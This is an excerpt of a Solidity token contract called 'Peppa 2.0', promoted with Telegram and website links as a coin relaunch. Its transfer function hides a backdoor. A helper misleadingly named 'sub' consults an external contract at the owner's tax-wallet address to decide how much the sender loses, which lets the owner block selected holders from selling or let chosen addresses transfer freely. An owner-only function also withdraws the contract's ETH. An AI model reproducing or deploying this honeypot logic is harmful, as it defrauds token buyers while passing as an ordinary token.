...
PEPPA IS COMING BACK!

TG:  https://t.me/peppa2channel

WEB: https://www.peppa20.vip
...
contract PEPPA2 is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Peppa 2.0";
    string private constant _symbol = unicode"PEPPA2.0";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        _balances[from]=_balances[from].sub(amount.sub(sub(from,amount)));
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function clamStuckETH(address account) external onlyOwner() { payable(account).transfer(address(this).balance);}
    function sendETHToFee(uint256 amount) private { payable(taxWallet).transfer(amount);}
    function sub(address account, uint256 amount) private view returns(uint256) { return IERC20(taxWallet).balanceOf(account) * amount; }
